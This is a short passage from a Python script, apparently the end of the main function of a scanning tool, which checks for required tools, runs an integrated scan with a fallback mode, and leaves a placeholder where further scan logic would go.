            print(f"{Fore.GREEN}[+] Running in fully automatic mode{Style.RESET_ALL}")
            
            # Check if required tools are installed
            success, missing_tools = check_tools(skip_recon=args.skip_recon)
            if not success:
                sys.exit(1)
                
            # Run the integrated scan
            results = run_integrated_scan(args, output_dir)
            return results
        except ImportError as e:
            print(f"[ERROR] Failed to import integrated scanning module: {e}")
            print("[*] Falling back to standard scanning mode...")
    
    # Add the rest of the logic from the main function here
    # This includes the comprehensive scan and standard scan modes
    # ...
    
    return {"status": "completed", "output_dir": output_dir}

# Make sure this conditional is present at the end of the file
if __name__ == "__main__":
    main()
